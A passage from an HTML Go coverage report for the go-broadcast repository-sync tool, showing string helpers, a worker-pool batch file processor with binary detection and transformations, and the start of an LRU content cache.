// This consolidates the common pattern: strings.TrimSpace(value) != ""
func IsNotEmpty(value string) bool <span class="cov8" title="1">{
        return strings.TrimSpace(value) != ""
}</span>

// EmptyToDefault returns the defaultValue if the input is empty or whitespace-only.
// This consolidates the common pattern of providing defaults for empty strings.
func EmptyToDefault(value, defaultValue string) string <span class="cov8" title="1">{
        if IsEmpty(value) </span><span class="cov8" title="1">{
                return defaultValue
        }</span>
        <span class="cov8" title="1">return strings.TrimSpace(value)</span>
}

// TrimAndLower trims whitespace and converts to lowercase.
// This consolidates a common pattern for normalizing user input.
func TrimAndLower(value string) string <span class="cov8" title="1">{
        return strings.ToLower(strings.TrimSpace(value))
}</span>

// ContainsAny checks if a string contains any of the provided substrings.
// This consolidates repetitive multiple strings.Contains calls.
func ContainsAny(text string, substrings ...string) bool <span class="cov8" title="1">{
        for _, substring := range substrings </span><span class="cov8" title="1">{
                if strings.Contains(text, substring) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// HasAnyPrefix checks if a string has any of the provided prefixes.
// This consolidates repetitive multiple strings.HasPrefix calls.
func HasAnyPrefix(text string, prefixes ...string) bool <span class="cov8" title="1">{
        for _, prefix := range prefixes </span><span class="cov8" title="1">{
                if strings.HasPrefix(text, prefix) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// HasAnySuffix checks if a string has any of the provided suffixes.
// This consolidates repetitive multiple strings.HasSuffix calls.
func HasAnySuffix(text string, suffixes ...string) bool <span class="cov8" title="1">{
        for _, suffix := range suffixes </span><span class="cov8" title="1">{
                if strings.HasSuffix(text, suffix) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// FormatRepoName formats a repository name as "org/repo".
// This consolidates the common pattern: fmt.Sprintf("org/%s", name)
func FormatRepoName(org, repo string) string <span class="cov8" title="1">{
        return fmt.Sprintf("%s/%s", org, repo)
}</span>

// FormatFilePath formats a file path with proper separators.
// This consolidates common path formatting patterns.
func FormatFilePath(parts ...string) string <span class="cov8" title="1">{
        if len(parts) == 0 </span><span class="cov8" title="1">{
                return ""
        }</span>
        <span class="cov8" title="1">return filepath.Join(parts...)</span>
}

// NormalizePath normalizes a path by cleaning it and converting to forward slashes.
// This consolidates the common patterns of filepath.Clean and filepath.ToSlash.
func NormalizePath(path string) string <span class="cov8" title="1">{
        return filepath.ToSlash(filepath.Clean(path))
}</span>

// SanitizeForFilename sanitizes a string to be safe for use as a filename.
// This consolidates the common pattern of replacing problematic characters.
func SanitizeForFilename(name string) string <span class="cov8" title="1">{
        // Replace common problematic characters
        sanitized := strings.ReplaceAll(name, "/", "-")
        sanitized = strings.ReplaceAll(sanitized, "\\", "-")
        sanitized = strings.ReplaceAll(sanitized, ":", "-")
        sanitized = strings.ReplaceAll(sanitized, "\"", "-")
        sanitized = strings.ReplaceAll(sanitized, "&lt;", "-")
        sanitized = strings.ReplaceAll(sanitized, "&gt;", "-")
        sanitized = strings.ReplaceAll(sanitized, "|", "-")
        sanitized = strings.ReplaceAll(sanitized, "?", "-")
        sanitized = strings.ReplaceAll(sanitized, "*", "-")
        return strings.TrimSpace(sanitized)
}</span>

// IsValidGitHubURL validates if a URL is a valid GitHub URL.
// This consolidates the common pattern of validating GitHub URLs.
func IsValidGitHubURL(rawURL string) bool <span class="cov8" title="1">{
        if IsEmpty(rawURL) </span><span class="cov8" title="1">{
                return false
        }</span>

        // Check for path traversal attempts
        <span class="cov8" title="1">if strings.Contains(rawURL, "..") </span><span class="cov8" title="1">{
                return false
        }</span>

        // Parse the URL
        <span class="cov8" title="1">parsedURL, err := url.Parse(rawURL)
        if err != nil </span><span class="cov0" title="0">{
                return false
        }</span>

        // Must be HTTPS and github.com
        <span class="cov8" title="1">return parsedURL.Scheme == "https" &amp;&amp; parsedURL.Host == "github.com"</span>
}

// ReplaceTemplateVars replaces template variables in content.
// This consolidates the common pattern of multiple strings.ReplaceAll calls.
func ReplaceTemplateVars(content string, replacements map[string]string) string <span class="cov8" title="1">{
        result := content
        for placeholder, replacement := range replacements </span><span class="cov8" title="1">{
                result = strings.ReplaceAll(result, placeholder, replacement)
        }</span>
        <span class="cov8" title="1">return result</span>
}
</pre>

		<pre class="file" id="file55" style="display: none">package sync

import (
        "context"
        "errors"
        "fmt"
        "os"
        "path/filepath"
        "sync"
        "time"

        "github.com/sirupsen/logrus"
        "golang.org/x/sync/errgroup"

        "github.com/mrz1836/go-broadcast/internal/config"
        internalerrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/state"
        "github.com/mrz1836/go-broadcast/internal/transform"
)

// BatchProcessor handles concurrent file processing with worker pools
type BatchProcessor struct {
        engine      *Engine
        target      config.TargetConfig
        sourceState *state.SourceState
        logger      *logrus.Entry
        workerCount int
}

// FileJob represents a file processing job
type FileJob struct {
        SourcePath string
        DestPath   string
        Transform  config.Transform

        // Directory-specific fields
        IsFromDirectory  bool
        DirectoryMapping *config.DirectoryMapping
        RelativePath     string
        FileIndex        int
        TotalFiles       int
}

// NewBatchProcessor creates a new batch processor with the specified worker count
func NewBatchProcessor(engine *Engine, target config.TargetConfig, sourceState *state.SourceState, logger *logrus.Entry, workerCount int) *BatchProcessor <span class="cov8" title="1">{
        if workerCount &lt;= 0 </span><span class="cov8" title="1">{
                workerCount = 10 // Default worker count
        }</span>

        <span class="cov8" title="1">return &amp;BatchProcessor{
                engine:      engine,
                target:      target,
                sourceState: sourceState,
                logger:      logger,
                workerCount: workerCount,
        }</span>
}

// ProcessFiles processes multiple files concurrently with error resilience
func (bp *BatchProcessor) ProcessFiles(ctx context.Context, sourcePath string, jobs []FileJob) ([]FileChange, error) <span class="cov8" title="1">{
        if len(jobs) == 0 </span><span class="cov8" title="1">{
                return nil, nil
        }</span>

        <span class="cov8" title="1">bp.logger.WithField("job_count", len(jobs)).Info("Starting batch file processing")

        // Create channels for job distribution
        jobChan := make(chan FileJob, len(jobs))
        resultChan := make(chan fileProcessResult, len(jobs))

        // Start worker goroutines
        g, ctx := errgroup.WithContext(ctx)

        // Limit concurrency to prevent resource exhaustion
        g.SetLimit(bp.workerCount)

        // Start workers
        for i := 0; i &lt; bp.workerCount; i++ </span><span class="cov8" title="1">{
                workerID := i
                g.Go(func() error </span><span class="cov8" title="1">{
                        return bp.worker(ctx, workerID, sourcePath, jobChan, resultChan)
                }</span>)
        }

        // Send jobs to workers
        <span class="cov8" title="1">go func() </span><span class="cov8" title="1">{
                defer close(jobChan)
                for _, job := range jobs </span><span class="cov8" title="1">{
                        select </span>{
                        case jobChan &lt;- job:<span class="cov8" title="1"></span>
                        case &lt;-ctx.Done():<span class="cov8" title="1">
                                return</span>
                        }
                }
        }()

        // Wait for all workers to complete
        <span class="cov8" title="1">if err := g.Wait(); err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("batch processing failed: %w", err)
        }</span>

        // Collect results
        <span class="cov8" title="1">close(resultChan)
        return bp.collectResults(resultChan), nil</span>
}

// fileProcessResult represents the result of processing a single file
type fileProcessResult struct {
        Change *FileChange
        Error  error
        Job    FileJob
}

// worker processes files from the job channel
func (bp *BatchProcessor) worker(ctx context.Context, workerID int, sourcePath string, jobChan &lt;-chan FileJob, resultChan chan&lt;- fileProcessResult) error <span class="cov8" title="1">{
        workerLogger := bp.logger.WithField("worker_id", workerID)
        workerLogger.Debug("Starting batch processor worker")

        for </span><span class="cov8" title="1">{
                select </span>{
                case job, ok := &lt;-jobChan:<span class="cov8" title="1">
                        if !ok </span><span class="cov8" title="1">{
                                workerLogger.Debug("Job channel closed, worker exiting")
                                return nil
                        }</span>

                        // Process the file job
                        <span class="cov8" title="1">result := bp.processFileJob(ctx, sourcePath, job, workerLogger)

                        // Send result (non-blocking)
                        select </span>{
                        case resultChan &lt;- result:<span class="cov8" title="1"></span>
                        case &lt;-ctx.Done():<span class="cov0" title="0">
                                return ctx.Err()</span>
                        }

                case &lt;-ctx.Done():<span class="cov8" title="1">
                        workerLogger.Debug("Context canceled, worker exiting")
                        return ctx.Err()</span>
                }
        }
}

// TransformMetrics tracks transformation performance and outcomes
type TransformMetrics struct {
        BinaryFilesSkipped int
        TransformDuration  time.Duration
        TransformErrors    int
        TransformSuccess   int
        TotalFilesChecked  int
}

// processFileJob processes a single file job with enhanced error handling, binary detection, and metrics
func (bp *BatchProcessor) processFileJob(ctx context.Context, sourcePath string, job FileJob, logger *logrus.Entry) fileProcessResult <span class="cov8" title="1">{
        return bp.processFileJobWithReporter(ctx, sourcePath, job, logger, nil)
}</span>

// processFileJobWithReporter processes a single file job with enhanced progress reporting
func (bp *BatchProcessor) processFileJobWithReporter(ctx context.Context, sourcePath string, job FileJob, logger *logrus.Entry, progressReporter EnhancedProgressReporter) fileProcessResult <span class="cov8" title="1">{
        processStart := time.Now()
        metrics := &amp;TransformMetrics{}
        defer func() </span><span class="cov8" title="1">{
                metrics.TransformDuration = time.Since(processStart)
                if bp.logger.Level &gt;= logrus.DebugLevel </span><span class="cov0" title="0">{
                        bp.logger.WithFields(logrus.Fields{
                                "file":                  job.DestPath,
                                "binary_files_skipped":  metrics.BinaryFilesSkipped,
                                "transform_duration_ms": metrics.TransformDuration.Milliseconds(),
                                "transform_errors":      metrics.TransformErrors,
                                "transform_success":     metrics.TransformSuccess,
                                "total_files_checked":   metrics.TotalFilesChecked,
                        }).Debug("File job processing metrics")
                }</span>
        }()

        <span class="cov8" title="1">logger = logger.WithFields(logrus.Fields{
                "source_path":       job.SourcePath,
                "dest_path":         job.DestPath,
                "is_from_directory": job.IsFromDirectory,
        })

        if job.IsFromDirectory </span><span class="cov8" title="1">{
                logger = logger.WithFields(logrus.Fields{
                        "relative_path": job.RelativePath,
                        "file_index":    job.FileIndex,
                        "total_files":   job.TotalFiles,
                })
                logger.Debug("Processing directory file job")
        }</span> else<span class="cov8" title="1"> {
                logger.Debug("Processing regular file job")
        }</span>

        // Build full source path
        <span class="cov8" title="1">fullSourcePath := filepath.Join(sourcePath, job.SourcePath)
        logger.WithField("full_source_path", fullSourcePath).Debug("Reading source file")

        // Check if source file exists
        srcContent, err := os.ReadFile(fullSourcePath) //nolint:gosec // Path is constructed from trusted configuration
        if err != nil </span><span class="cov8" title="1">{
                if os.IsNotExist(err) </span><span class="cov8" title="1">{
                        logger.Debug("Source file not found, skipping")
                        return fileProcessResult{
                                Change: nil,
                                Error:  internalerrors.ErrFileNotFound,
                                Job:    job,
                        }
                }</span>
                <span class="cov0" title="0">logger.WithError(err).Error("Failed to read source file")
                return fileProcessResult{
                        Change: nil,
                        Error:  fmt.Errorf("failed to read source file %s: %w", job.SourcePath, err),
                        Job:    job,
                }</span>
        }

        <span class="cov8" title="1">metrics.TotalFilesChecked++
        logger.WithField("content_size", len(srcContent)).Debug("Source file content loaded")

        // Check for binary content before applying transformations
        if transform.IsBinary(job.SourcePath, srcContent) </span><span class="cov8" title="1">{
                metrics.BinaryFilesSkipped++

                // Report binary file metrics to progress reporter
                if progressReporter != nil </span><span class="cov8" title="1">{
                        progressReporter.RecordBinaryFileSkipped(int64(len(srcContent)))
                }</span>

                <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                        "file_path":    job.SourcePath,
                        "content_size": len(srcContent),
                }).Info("Binary file detected, skipping transformations")

                // Check if content actually changed (for existing files)
                existingContent, existingErr := bp.getExistingFileContent(ctx, job.DestPath)
                if existingErr == nil &amp;&amp; string(existingContent) == string(srcContent) </span><span class="cov8" title="1">{
                        logger.Debug("Binary file content unchanged, skipping")
                        return fileProcessResult{
                                Change: nil,
                                Error:  internalerrors.ErrTransformNotFound,
                                Job:    job,
                        }
                }</span>

                // Create file change for binary file (no transformation)
                <span class="cov8" title="1">change := &amp;FileChange{
                        Path:            job.DestPath,
                        Content:         srcContent, // Use original content for binary files
                        OriginalContent: srcContent,
                        IsNew:           existingErr != nil, // existingErr means file doesn't exist
                }

                logger.Debug("Binary file processed successfully (no transformation)")
                metrics.TransformSuccess++

                // Report successful processing
                if progressReporter != nil </span><span class="cov8" title="1">{
                        progressReporter.RecordTransformSuccess(time.Since(processStart))
                }</span>

                <span class="cov8" title="1">return fileProcessResult{
                        Change: change,
                        Error:  nil,
                        Job:    job,
                }</span>
        }

        <span class="cov8" title="1">logger.Debug("Text file detected, applying transformations")

        // Apply transformations with enhanced context and error isolation
        transformedContent := srcContent
        if job.Transform.RepoName || len(job.Transform.Variables) &gt; 0 </span><span class="cov8" title="1">{
                transformStart := time.Now()
                logger.WithFields(logrus.Fields{
                        "repo_name_transform": job.Transform.RepoName,
                        "variables_count":     len(job.Transform.Variables),
                        "variables":           job.Transform.Variables,
                }).Debug("Starting content transformation")

                // Create appropriate transform context based on job type
                var transformContext transform.Context
                if job.IsFromDirectory &amp;&amp; job.DirectoryMapping != nil </span><span class="cov8" title="1">{
                        // Use DirectoryTransformContext for directory-aware transformations
                        baseCtx := transform.Context{
                                SourceRepo: bp.sourceState.Repo,
                                TargetRepo: bp.target.Repo,
                                FilePath:   job.DestPath,
                                Variables:  job.Transform.Variables,
                                LogConfig: &amp;logging.LogConfig{
                                        Debug: logging.DebugFlags{
                                                Transform: bp.logger.Level &gt;= logrus.DebugLevel,
                                        },
                                        Verbose: func() int </span><span class="cov8" title="1">{
                                                if bp.logger.Level &gt;= logrus.DebugLevel </span><span class="cov0" title="0">{
                                                        return 2
                                                }</span>
                                                <span class="cov8" title="1">return 0</span>
                                        }(),
                                },
                        }

                        <span class="cov8" title="1">dirTransformCtx := transform.NewDirectoryTransformContext(
                                baseCtx,
                                job.DirectoryMapping,
                                job.RelativePath,
                                job.FileIndex,
                                job.TotalFiles,
                        )

                        logger.WithFields(logrus.Fields{
                                "directory_context": dirTransformCtx.String(),
                                "source_dir":        job.DirectoryMapping.Src,
                                "dest_dir":          job.DirectoryMapping.Dest,
                        }).Debug("Using DirectoryTransformContext")

                        // DirectoryTransformContext embeds Context, so we can use it directly
                        transformContext = dirTransformCtx.Context</span>
                } else<span class="cov8" title="1"> {
                        // Use regular Context for single file transformations
                        transformContext = transform.Context{
                                SourceRepo: bp.sourceState.Repo,
                                TargetRepo: bp.target.Repo,
                                FilePath:   job.DestPath,
                                Variables:  job.Transform.Variables,
                                LogConfig: &amp;logging.LogConfig{
                                        Debug: logging.DebugFlags{
                                                Transform: bp.logger.Level &gt;= logrus.DebugLevel,
                                        },
                                        Verbose: func() int </span><span class="cov8" title="1">{
                                                if bp.logger.Level &gt;= logrus.DebugLevel </span><span class="cov0" title="0">{
                                                        return 2
                                                }</span>
                                                <span class="cov8" title="1">return 0</span>
                                        }(),
                                },
                        }

                        <span class="cov8" title="1">logger.WithField("transform_context", fmt.Sprintf("%+v", transformContext)).Debug("Using regular TransformContext")</span>
                }

                // Apply transformation with error isolation - don't fail entire batch on transform errors
                <span class="cov8" title="1">transformedContent, err = bp.engine.transform.Transform(ctx, srcContent, transformContext)
                transformDuration := time.Since(transformStart)

                logger.WithFields(logrus.Fields{
                        "transform_duration_ms": transformDuration.Milliseconds(),
                        "content_size_before":   len(srcContent),
                        "content_size_after":    len(transformedContent),
                        "content_changed":       len(srcContent) != len(transformedContent) || string(srcContent) != string(transformedContent),
                }).Debug("Transformation completed")

                if err != nil </span><span class="cov8" title="1">{
                        metrics.TransformErrors++

                        // Report transformation error to progress reporter
                        if progressReporter != nil </span><span class="cov0" title="0">{
                                progressReporter.RecordTransformError()
                        }</span>

                        // Log error but don't fail the entire batch - use original content as fallback
                        <span class="cov8" title="1">logger.WithError(err).WithFields(logrus.Fields{
                                "fallback_strategy":     "use_original_content",
                                "transform_duration_ms": transformDuration.Milliseconds(),
                        }).Warn("Transformation failed, using original content as fallback")

                        // Use original content if transformation fails
                        transformedContent = srcContent</span>
                } else<span class="cov8" title="1"> {
                        metrics.TransformSuccess++

                        // Report transformation success to progress reporter
                        if progressReporter != nil </span><span class="cov8" title="1">{
                                progressReporter.RecordTransformSuccess(transformDuration)
                        }</span>

                        <span class="cov8" title="1">logger.Debug("Transformation successful")</span>
                }
        } else<span class="cov8" title="1"> {
                logger.Debug("No transformations configured, using original content")
                metrics.TransformSuccess++

                // Report success for no-transform case (instantaneous)
                if progressReporter != nil </span><span class="cov0" title="0">{
                        progressReporter.RecordTransformSuccess(0)
                }</span>
        }

        // Check if content actually changed (for existing files)
        <span class="cov8" title="1">existingContent, err := bp.getExistingFileContent(ctx, job.DestPath)
        if err == nil &amp;&amp; string(existingContent) == string(transformedContent) </span><span class="cov0" title="0">{
                logger.Debug("File content unchanged after transformation, skipping")
                return fileProcessResult{
                        Change: nil,
                        Error:  internalerrors.ErrTransformNotFound,
                        Job:    job,
                }
        }</span>

        // Create file change
        <span class="cov8" title="1">change := &amp;FileChange{
                Path:            job.DestPath,
                Content:         transformedContent,
                OriginalContent: srcContent,
                IsNew:           err != nil, // err means file doesn't exist
        }

        logger.WithFields(logrus.Fields{
                "is_new_file":           change.IsNew,
                "final_content_size":    len(change.Content),
                "original_content_size": len(change.OriginalContent),
        }).Debug("File processed successfully")

        return fileProcessResult{
                Change: change,
                Error:  nil,
                Job:    job,
        }</span>
}

// collectResults collects and filters results from the result channel
func (bp *BatchProcessor) collectResults(resultChan &lt;-chan fileProcessResult) []FileChange <span class="cov8" title="1">{
        var changes []FileChange
        var errorCount int
        var skipCount int
        var directoryFilesCount int

        for result := range resultChan </span><span class="cov8" title="1">{
                // Track directory vs regular files
                if result.Job.IsFromDirectory </span><span class="cov8" title="1">{
                        directoryFilesCount++
                }</span>

                // Track binary files processed (successful results that might have been binary)
                <span class="cov8" title="1">if result.Error == nil &amp;&amp; result.Change != nil </span><span class="cov8" title="1">{
                        // We can't easily detect if it was binary here, but we can log it was processed
                        if result.Job.IsFromDirectory </span><span class="cov8" title="1">{
                                bp.logger.WithFields(logrus.Fields{
                                        "file":          result.Job.DestPath,
                                        "relative_path": result.Job.RelativePath,
                                        "directory":     result.Job.DirectoryMapping.Src,
                                }).Debug("Directory file processed successfully")
                        }</span>
                }

                <span class="cov8" title="1">if result.Error != nil </span><span class="cov8" title="1">{
                        // Handle different error types gracefully
                        if errors.Is(result.Error, internalerrors.ErrTransformNotFound) </span><span class="cov8" title="1">{
                                skipCount++
                                bp.logger.WithField("file", result.Job.DestPath).Debug("File content unchanged, skipping")
                                continue</span>
                        }
                        <span class="cov8" title="1">if errors.Is(result.Error, internalerrors.ErrFileNotFound) </span><span class="cov8" title="1">{
                                skipCount++
                                bp.logger.WithField("file", result.Job.SourcePath).Debug("Source file not found, skipping")
                                continue</span>
                        }

                        // For other errors, log but continue processing other files
                        <span class="cov8" title="1">errorCount++
                        bp.logger.WithError(result.Error).WithFields(logrus.Fields{
                                "file":              result.Job.SourcePath,
                                "is_from_directory": result.Job.IsFromDirectory,
                        }).Error("File processing failed")
                        continue</span>
                }

                <span class="cov8" title="1">if result.Change != nil </span><span class="cov8" title="1">{
                        changes = append(changes, *result.Change)
                }</span>
        }

        <span class="cov8" title="1">bp.logger.WithFields(logrus.Fields{
                "processed":       len(changes),
                "skipped":         skipCount,
                "errors":          errorCount,
                "directory_files": directoryFilesCount,
                "regular_files":   len(changes) + skipCount + errorCount - directoryFilesCount,
        }).Info("Batch processing completed with enhanced metrics")

        return changes</span>
}

// getExistingFileContent retrieves the current content of a file from the target repo
func (bp *BatchProcessor) getExistingFileContent(ctx context.Context, filePath string) ([]byte, error) <span class="cov8" title="1">{
        // Try to get file from the target repository's default branch
        fileContent, err := bp.engine.gh.GetFile(ctx, bp.target.Repo, filePath, "")
        if err != nil </span><span class="cov8" title="1">{
                return nil, err
        }</span>
        <span class="cov8" title="1">return fileContent.Content, nil</span>
}

// ProcessorStats provides statistics about batch processing performance
type ProcessorStats struct {
        TotalJobs          int
        ProcessedJobs      int
        SkippedJobs        int
        FailedJobs         int
        WorkerCount        int
        BinaryFilesSkipped int
        DirectoryFiles     int
        RegularFiles       int
        TransformErrors    int
        TransformSuccess   int
}

// GetStats returns processing statistics
func (bp *BatchProcessor) GetStats() ProcessorStats <span class="cov8" title="1">{
        return ProcessorStats{
                WorkerCount: bp.workerCount,
        }
}</span>

// ConfiguredWorkerCount returns the configured worker count
func (bp *BatchProcessor) ConfiguredWorkerCount() int <span class="cov8" title="1">{
        return bp.workerCount
}</span>

// SetWorkerCount updates the worker count (affects future processing only)
func (bp *BatchProcessor) SetWorkerCount(count int) <span class="cov8" title="1">{
        if count &gt; 0 </span><span class="cov8" title="1">{
                bp.workerCount = count
        }</span>
}

// NewFileJob creates a new FileJob for regular file processing
func NewFileJob(sourcePath, destPath string, transform config.Transform) FileJob <span class="cov8" title="1">{
        return FileJob{
                SourcePath:       sourcePath,
                DestPath:         destPath,
                Transform:        transform,
                IsFromDirectory:  false,
                DirectoryMapping: nil,
                RelativePath:     "",
                FileIndex:        0,
                TotalFiles:       1,
        }
}</span>

// NewDirectoryFileJob creates a new FileJob for directory file processing
func NewDirectoryFileJob(
        sourcePath, destPath string,
        transform config.Transform,
        directoryMapping *config.DirectoryMapping,
        relativePath string,
        fileIndex, totalFiles int,
) FileJob <span class="cov8" title="1">{
        return FileJob{
                SourcePath:       sourcePath,
                DestPath:         destPath,
                Transform:        transform,
                IsFromDirectory:  true,
                DirectoryMapping: directoryMapping,
                RelativePath:     relativePath,
                FileIndex:        fileIndex,
                TotalFiles:       totalFiles,
        }
}</span>

// ProcessFilesWithProgress processes files with progress reporting
func (bp *BatchProcessor) ProcessFilesWithProgress(ctx context.Context, sourcePath string, jobs []FileJob, progressReporter ProgressReporter) ([]FileChange, error) <span class="cov8" title="1">{
        if len(jobs) == 0 </span><span class="cov0" title="0">{
                return nil, nil
        }</span>

        <span class="cov8" title="1">bp.logger.WithField("job_count", len(jobs)).Info("Starting batch file processing with progress reporting")

        // Create channels for job distribution
        jobChan := make(chan FileJob, len(jobs))
        resultChan := make(chan fileProcessResult, len(jobs))

        // Initialize progress
        if progressReporter != nil </span><span class="cov8" title="1">{
                progressReporter.UpdateProgress(0, len(jobs), "Starting file processing...")
        }</span>

        // Start worker goroutines
        <span class="cov8" title="1">g, ctx := errgroup.WithContext(ctx)
        g.SetLimit(bp.workerCount)

        // Progress tracking
        var processed int32
        var mu sync.Mutex

        // Start workers with progress tracking
        for i := 0; i &lt; bp.workerCount; i++ </span><span class="cov8" title="1">{
                workerID := i
                g.Go(func() error </span><span class="cov8" title="1">{
                        return bp.workerWithProgress(ctx, workerID, sourcePath, jobChan, resultChan, &amp;processed, &amp;mu, len(jobs), progressReporter)
                }</span>)
        }

        // Send jobs to workers
        <span class="cov8" title="1">go func() </span><span class="cov8" title="1">{
                defer close(jobChan)
                for _, job := range jobs </span><span class="cov8" title="1">{
                        select </span>{
                        case jobChan &lt;- job:<span class="cov8" title="1"></span>
                        case &lt;-ctx.Done():<span class="cov0" title="0">
                                return</span>
                        }
                }
        }()

        // Wait for all workers to complete
        <span class="cov8" title="1">if err := g.Wait(); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("batch processing failed: %w", err)
        }</span>

        // Final progress update
        <span class="cov8" title="1">if progressReporter != nil </span><span class="cov8" title="1">{
                progressReporter.UpdateProgress(len(jobs), len(jobs), "File processing completed")
        }</span>

        // Collect results
        <span class="cov8" title="1">close(resultChan)
        return bp.collectResults(resultChan), nil</span>
}

// workerWithProgress processes files with progress updates
func (bp *BatchProcessor) workerWithProgress(ctx context.Context, workerID int, sourcePath string, jobChan &lt;-chan FileJob, resultChan chan&lt;- fileProcessResult, processed *int32, mu *sync.Mutex, totalJobs int, progressReporter ProgressReporter) error <span class="cov8" title="1">{
        workerLogger := bp.logger.WithField("worker_id", workerID)
        workerLogger.Debug("Starting batch processor worker with progress tracking")

        // Try to cast to enhanced progress reporter
        enhancedReporter, _ := progressReporter.(EnhancedProgressReporter)

        for </span><span class="cov8" title="1">{
                select </span>{
                case job, ok := &lt;-jobChan:<span class="cov8" title="1">
                        if !ok </span><span class="cov8" title="1">{
                                workerLogger.Debug("Job channel closed, worker exiting")
                                return nil
                        }</span>

                        // Process the file job with enhanced reporting if available
                        <span class="cov8" title="1">var result fileProcessResult
                        if enhancedReporter != nil </span><span class="cov8" title="1">{
                                result = bp.processFileJobWithReporter(ctx, sourcePath, job, workerLogger, enhancedReporter)
                        }</span> else<span class="cov8" title="1"> {
                                result = bp.processFileJob(ctx, sourcePath, job, workerLogger)
                        }</span>

                        // Send result (non-blocking)
                        <span class="cov8" title="1">select </span>{
                        case resultChan &lt;- result:<span class="cov8" title="1"></span>
                        case &lt;-ctx.Done():<span class="cov0" title="0">
                                return ctx.Err()</span>
                        }

                        // Update progress
                        <span class="cov8" title="1">if progressReporter != nil </span><span class="cov8" title="1">{
                                mu.Lock()
                                *processed++
                                currentCount := int(*processed)
                                mu.Unlock()

                                progressReporter.UpdateProgress(currentCount, totalJobs, fmt.Sprintf("Processing files... (%d/%d)", currentCount, totalJobs))
                        }</span>

                case &lt;-ctx.Done():<span class="cov0" title="0">
                        workerLogger.Debug("Context canceled, worker exiting")
                        return ctx.Err()</span>
                }
        }
}

// ProgressReporter defines the interface for progress reporting
type ProgressReporter interface {
        UpdateProgress(current, total int, message string)
}

// EnhancedProgressReporter extends ProgressReporter with binary file metrics support
type EnhancedProgressReporter interface {
        ProgressReporter
        RecordBinaryFileSkipped(size int64)
        RecordTransformError()
        RecordTransformSuccess(duration time.Duration)
}
</pre>

		<pre class="file" id="file56" style="display: none">package sync

import (
        "context"
        "crypto/sha256"
        "errors"
        "fmt"
        "sync"
        "sync/atomic"
        "time"

        "github.com/sirupsen/logrus"
)

// Static error variables
var (
        ErrContentSizeExceedsCache = errors.New("content size exceeds maximum cache size")
)

// CacheStats provides cache performance metrics
type CacheStats struct {
        Hits           int64     `json:"hits"`
        Misses         int64     `json:"misses"`
        Evictions      int64     `json:"evictions"`
        Size           int64     `json:"size"`
        MemoryUsage    int64     `json:"memory_usage_bytes"`
        HitRate        float64   `json:"hit_rate"`
        LastAccessed   time.Time `json:"last_accessed"`
        CreatedAt      time.Time `json:"created_at"`
        InvalidationID int64     `json:"invalidation_id"`
}

// ContentEntry represents a cached file content with metadata
type ContentEntry struct {
        Content    string
        Hash       string
        Size       int64
        ExpiresAt  time.Time
        AccessedAt time.Time
        CreatedAt  time.Time
}

// cacheKey represents the composite key for cache entries
type cacheKey struct {
        Repo   string
        Branch string
        Path   string
}

// String returns the string representation of the cache key
func (k cacheKey) String() string <span class="cov0" title="0">{
        return fmt.Sprintf("%s:%s:%s", k.Repo, k.Branch, k.Path)
}</span>

// lruNode represents a node in the LRU doubly-linked list
type lruNode struct {
        key       cacheKey
        contentID string // SHA256 hash of content
        prev      *lruNode
        next      *lruNode
}

// ContentCache provides thread-safe caching of file contents with LRU eviction
type ContentCache struct {
        mu             sync.RWMutex
        contents       map[string]*ContentEntry // contentID -&gt; entry
        keyToContentID map[cacheKey]string      // key -&gt; contentID mapping
        lruHead        *lruNode                 // most recently used
        lruTail        *lruNode                 // least recently used

        // Configuration
        ttl            time.Duration
        maxMemoryBytes int64
        logger         *logrus.Entry

        // Metrics
        hits           atomic.Int64
        misses         atomic.Int64
        evictions      atomic.Int64
        currentMemory  atomic.Int64
        lastAccessed   atomic.Int64 // unix timestamp
        createdAt      time.Time
        invalidationID atomic.Int64

        // Cleanup
        stopCleanup chan struct{}
        cleanupOnce sync.Once
}

// NewContentCache creates a new content cache with the specified configuration
func NewContentCache(ttl time.Duration, maxMemoryBytes int64, logger *logrus.Entry) *ContentCache <span class="cov8" title="1">{
        if ttl &lt;= 0 </span><span class="cov0" title="0">{
                ttl = 15 * time.Minute // Default 15-minute TTL
        }</span>
        <span class="cov8" title="1">if maxMemoryBytes &lt;= 0 </span><span class="cov0" title="0">{
                maxMemoryBytes = 100 * 1024 * 1024 // Default 100MB
        }</span>
        <span class="cov8" title="1">if logger == nil </span><span class="cov0" title="0">{
                logger = logrus.NewEntry(logrus.StandardLogger())
        }</span>

        <span class="cov8" title="1">cache := &amp;ContentCache{
                contents:       make(map[string]*ContentEntry),
                keyToContentID: make(map[cacheKey]string),
                ttl:            ttl,
                maxMemoryBytes: maxMemoryBytes,
                logger:         logger.WithField("component", "content_cache"),
                stopCleanup:    make(chan struct{}),
                createdAt:      time.Now(),
        }

        // Initialize LRU list with sentinel nodes
        cache.lruHead = &amp;lruNode{}
        cache.lruTail = &amp;lruNode{}
        cache.lruHead.next = cache.lruTail
        cache.lruTail.prev = cache.lruHead

        // Start cleanup goroutine
        go cache.cleanup()

        return cache</span>
}

// Get retrieves content from cache, returning content, hit/miss status, and error
func (c *ContentCache) Get(ctx context.Context, repo, branch, path string) (string, bool, error) <span class="cov8" title="1">{
        if ctx.Err() != nil </span><span class="cov8" title="1">{
                return "", false, ctx.Err()
        }</span>

        <span class="cov8" title="1">key := cacheKey{Repo: repo, Branch: branch, Path: path}

        c.mu.RLock()
        contentID, exists := c.keyToContentID[key]
        if !exists </span><span class="cov8" title="1">{
                c.mu.RUnlock()
                c.misses.Add(1)
                return "", false, nil
        }</span>

        <span class="cov8" title="1">entry, exists := c.contents[contentID]
        if !exists </span><span class="cov0" title="0">{
                c.mu.RUnlock()
                // Clean up stale key mapping
                c.mu.Lock()
                delete(c.keyToContentID, key)
                c.mu.Unlock()
                c.misses.Add(1)
                return "", false, nil
        }</span>

        // Check expiration
        <span class="cov8" title="1">if time.Now().After(entry.ExpiresAt) </span><span class="cov8" title="1">{
                c.mu.RUnlock()
                c.evictExpired()
                c.misses.Add(1)
                return "", false, nil
        }</span>
        <span class="cov8" title="1">c.mu.RUnlock()

        // Update access time and LRU position
        c.mu.Lock()
